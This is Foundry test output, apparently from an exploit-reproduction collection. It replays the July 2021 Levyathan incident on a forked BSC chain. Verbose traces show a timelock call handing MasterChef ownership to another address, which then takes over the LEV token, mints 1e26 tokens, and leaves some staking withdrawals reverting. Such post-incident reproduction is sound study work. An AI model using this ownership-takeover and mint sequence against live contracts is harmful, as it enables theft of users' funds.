Compiling 21 files with Solc 0.8.28
Compiling 19 files with Solc 0.8.10
Solc 0.8.10 finished in 903.22ms
Solc 0.8.28 finished in 938.24ms
Compiler run successful!

Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 23756)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [7939] ExploitScript::setUp()
    ├─ [0] VM::createSelectFork("mainnet", 1234567 [1.234e6])
    │   └─ ← [Return] 0
    └─ ← [Stop]

  [23756] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return]
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.17s (1.86ms CPU time)

Ran 1 test for src/test/2021-07/Levyathan_exp.sol:ContractTest
[PASS] test_Timelock() (gas: 174732)
Traces:
  [15194] ContractTest::setUp()
    ├─ [0] VM::createSelectFork("bsc", 9545966 [9.545e6])
    │   └─ ← [Return] 0
    ├─ [0] VM::label(MasterChef: [0xA3fDF7F376F4BFD38D7C4A5cf8AAb4dE68792fd4], "MasterChef")
    │   └─ ← [Return]
    ├─ [0] VM::label(LEV: [0x304c62b5B030176F8d328d3A01FEaB632FC929BA], "LEV")
    │   └─ ← [Return]
    ├─ [0] VM::label(Timelock: [0x16149999C85c3E3f7d1B9402a4c64d125877d89D], "Timelock")
    │   └─ ← [Return]
    ├─ [0] VM::label(Deployer: [0x6DeBA0F8aB4891632fB8d381B27eceC7f7743A14], "Deployer")
    │   └─ ← [Return]
    └─ ← [Stop]

  [184332] ContractTest::test_Timelock()
    ├─ [0] VM::startPrank(Deployer: [0x6DeBA0F8aB4891632fB8d381B27eceC7f7743A14])
    │   └─ ← [Return]
    ├─ [32053] Timelock::schedule(MasterChef: [0xA3fDF7F376F4BFD38D7C4A5cf8AAb4dE68792fd4], 0, 0xf2fde38b0000000000000000000000007507f84610f6d656a70eb8cdec044674799265d3, 0x0000000000000000000000000000000000000000000000000000000000000000, 0xf6ee06c6a62a6a42d1ad9d321d45c4f92a7a215509c850ee36fb025ba767a764, 172800 [1.728e5])
    │   ├─  emit topic 0: 0x4cf4410cc57040e44862ef0f45f3dd5a5e02db8eb8add648d4b0e236f1d07dca
    │   │        topic 1: 0x691de0423f190dab6d72e5784656b8f2021907534ac79d6295dc26be8231d2bc
    │   │        topic 2: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │           data: 0x000000000000000000000000a3fdf7f376f4bfd38d7c4a5cf8aab4de68792fd4000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002a3000000000000000000000000000000000000000000000000000000000000000024f2fde38b0000000000000000000000007507f84610f6d656a70eb8cdec044674799265d300000000000000000000000000000000000000000000000000000000
    │   ├─  storage changes:
    │   │   @ 0x62a72bf21e35a46d47e1a09bec2aa4a6440083358898bd5b236970e27e35499f: 0 → 0x000000000000000000000000000000000000000000000000000000006103da4c
    │   └─ ← [Stop]
    ├─ [1209] Timelock::hashOperation(MasterChef: [0xA3fDF7F376F4BFD38D7C4A5cf8AAb4dE68792fd4], 0, 0xf2fde38b0000000000000000000000007507f84610f6d656a70eb8cdec044674799265d3, 0x0000000000000000000000000000000000000000000000000000000000000000, 0xf6ee06c6a62a6a42d1ad9d321d45c4f92a7a215509c850ee36fb025ba767a764)
    │   └─ ← [Return] 0x691de0423f190dab6d72e5784656b8f2021907534ac79d6295dc26be8231d2bc
    ├─ [606] Timelock::isOperationPending(0x691de0423f190dab6d72e5784656b8f2021907534ac79d6295dc26be8231d2bc)
    │   └─ ← [Return] true
    ├─ [0] VM::assertTrue(true) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::roll(9600775 [9.6e6])
    │   └─ ← [Return]
    ├─ [0] VM::warp(1627642444 [1.627e9])
    │   └─ ← [Return]
    ├─ [17675] Timelock::execute(MasterChef: [0xA3fDF7F376F4BFD38D7C4A5cf8AAb4dE68792fd4], 0, 0xf2fde38b0000000000000000000000007507f84610f6d656a70eb8cdec044674799265d3, 0x0000000000000000000000000000000000000000000000000000000000000000, 0xf6ee06c6a62a6a42d1ad9d321d45c4f92a7a215509c850ee36fb025ba767a764)
    │   ├─ [7304] MasterChef::transferOwnership(0x7507f84610f6D656a70eb8CDEC044674799265D3)
    │   │   ├─ emit OwnershipTransferred(param0: Timelock: [0x16149999C85c3E3f7d1B9402a4c64d125877d89D], param1: 0x7507f84610f6D656a70eb8CDEC044674799265D3)
    │   │   ├─  storage changes:
    │   │   │   @ 0: 0x00000000000000000000000016149999c85c3e3f7d1b9402a4c64d125877d89d → 0x0000000000000000000000007507f84610f6d656a70eb8cdec044674799265d3
    │   │   └─ ← [Stop]
    │   ├─  emit topic 0: 0xc2617efa69bab66782fa219543714338489c4e9e178271560a91b82c3f612b58
    │   │        topic 1: 0x691de0423f190dab6d72e5784656b8f2021907534ac79d6295dc26be8231d2bc
    │   │        topic 2: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │           data: 0x000000000000000000000000a3fdf7f376f4bfd38d7c4a5cf8aab4de68792fd4000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000024f2fde38b0000000000000000000000007507f84610f6d656a70eb8cdec044674799265d300000000000000000000000000000000000000000000000000000000
    │   ├─  storage changes:
    │   │   @ 0: 0x00000000000000000000000016149999c85c3e3f7d1b9402a4c64d125877d89d → 0x0000000000000000000000007507f84610f6d656a70eb8cdec044674799265d3
    │   │   @ 0x62a72bf21e35a46d47e1a09bec2aa4a6440083358898bd5b236970e27e35499f: 0x000000000000000000000000000000000000000000000000000000006103da4c → 1
    │   └─ ← [Stop]
    ├─ [490] Timelock::isOperationDone(0x691de0423f190dab6d72e5784656b8f2021907534ac79d6295dc26be8231d2bc)
    │   └─ ← [Return] true
    ├─ [0] VM::assertTrue(true) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] VM::startPrank(0x7507f84610f6D656a70eb8CDEC044674799265D3)
    │   └─ ← [Return]
    ├─ [12612] MasterChef::recoverLevOwnership()
    │   ├─ [7310] LEV::transferOwnership(0x7507f84610f6D656a70eb8CDEC044674799265D3)
    │   │   ├─ emit OwnershipTransferred(param0: MasterChef: [0xA3fDF7F376F4BFD38D7C4A5cf8AAb4dE68792fd4], param1: 0x7507f84610f6D656a70eb8CDEC044674799265D3)
    │   │   ├─  storage changes:
    │   │   │   @ 5: 0x000000000000000000000000a3fdf7f376f4bfd38d7c4a5cf8aab4de68792fd4 → 0x0000000000000000000000007507f84610f6d656a70eb8cdec044674799265d3
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [29823] LEV::mint(0x7507f84610f6D656a70eb8CDEC044674799265D3, 100000000000000000000000000 [1e26])
    │   ├─ emit Transfer(param0: 0x0000000000000000000000000000000000000000, param1: 0x7507f84610f6D656a70eb8CDEC044674799265D3, param2: 100000000000000000000000000 [1e26])
    │   ├─  storage changes:
    │   │   @ 2: 0x0000000000000000000000000000000000000000000d909656ec03ea680a0197 → 0x00000000000000000000000000000000000000000060486933b410bd4c0a0197
    │   │   @ 0xebaeb3d60da5a0583c243167775196d794412518acfa27f819832c8336e5e9e4: 0 → 0x00000000000000000000000000000000000000000052b7d2dcc80cd2e4000000
    │   └─ ← [Stop]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] VM::expectRevert(custom error 0xf4844814)
    │   └─ ← [Return]
    ├─ [0] VM::startPrank(0x160B6772c9976d21ddFB3e3211989Fa099451af7)
    │   └─ ← [Return]
    ├─ [4828] MasterChef::leaveStaking(10000 [1e4])
    │   └─ ← [Revert] revert: withdraw: not good
    ├─ [0] VM::expectRevert(custom error 0xf4844814)
    │   └─ ← [Return]
    ├─ [5022] MasterChef::withdraw(3, 272356000000000000000000 [2.723e23])
    │   └─ ← [Revert] revert: withdraw: not good
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] VM::startPrank(0x2db0500e1942626944efB106D6A66755802Cef20)
    │   └─ ← [Return]
    ├─ [32604] MasterChef::emergencyWithdraw(4)
    │   ├─ [12935] 0xB04c92A631c8c350Cf81b5b54A0FE8dfbCC68677::transfer(0x2db0500e1942626944efB106D6A66755802Cef20, 1539179583689842987556 [1.539e21])
    │   │   ├─ emit Transfer(param0: MasterChef: [0xA3fDF7F376F4BFD38D7C4A5cf8AAb4dE68792fd4], param1: 0x2db0500e1942626944efB106D6A66755802Cef20, param2: 1539179583689842987556 [1.539e21])
    │   │   ├─  storage changes:
    │   │   │   @ 0xc36e1b799d4a007c8dffc10ec9366270bd8609407db5f687689eb651d51b74ae: 1 → 0x00000000000000000000000000000000000000000000005370685c7166b79225
    │   │   │   @ 0xc3a894fb4b5499c6b376f19f75c0bfaa47d349f1941911b368de78947f0832a7: 0x000000000000000000000000000000000000000000000120802c055e31b63700 → 0x0000000000000000000000000000000000000000000000cd0fc3a8eccafea4dc
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   ├─  emit topic 0: 0xbb757047c2b5f3974fe26b7c10f732e7bce710b0952a71082702781e62ae0595
    │   │        topic 1: 0x0000000000000000000000002db0500e1942626944efb106d6a66755802cef20
    │   │        topic 2: 0x0000000000000000000000000000000000000000000000000000000000000004
    │   │           data: 0x00000000000000000000000000000000000000000000005370685c7166b79224
    │   ├─  storage changes:
    │   │   @ 0x7ccf88655f2d91ec3ea137b4d5fa565297323b5f1fc8ed98ba05942f349a40c6: 0x0000000000000000000000000000000000000000000000008ac893e8b1bf8200 → 0
    │   │   @ 0x7ccf88655f2d91ec3ea137b4d5fa565297323b5f1fc8ed98ba05942f349a40c7: 0x00000000000000000000000000000000000000000000005370685c7166b79224 → 0
    │   └─ ← [Stop]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] VM::startPrank(0x2db0500e1942626944efB106D6A66755802Cef20)
    │   └─ ← [Return]
    ├─ [6804] MasterChef::emergencyWithdraw(4)
    │   ├─ [3335] 0xB04c92A631c8c350Cf81b5b54A0FE8dfbCC68677::transfer(0x2db0500e1942626944efB106D6A66755802Cef20, 0)
    │   │   ├─ emit Transfer(param0: MasterChef: [0xA3fDF7F376F4BFD38D7C4A5cf8AAb4dE68792fd4], param1: 0x2db0500e1942626944efB106D6A66755802Cef20, param2: 0)
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   ├─  emit topic 0: 0xbb757047c2b5f3974fe26b7c10f732e7bce710b0952a71082702781e62ae0595
    │   │        topic 1: 0x0000000000000000000000002db0500e1942626944efb106d6a66755802cef20
    │   │        topic 2: 0x0000000000000000000000000000000000000000000000000000000000000004
    │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   └─ ← [Stop]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─  storage changes:
    │   @ 0xc36e1b799d4a007c8dffc10ec9366270bd8609407db5f687689eb651d51b74ae: 1 → 0x00000000000000000000000000000000000000000000005370685c7166b79225
    │   @ 0x62a72bf21e35a46d47e1a09bec2aa4a6440083358898bd5b236970e27e35499f: 0 → 1
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 13.23s (8.11s CPU time)

Ran 2 test suites in 15.90s (14.40s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
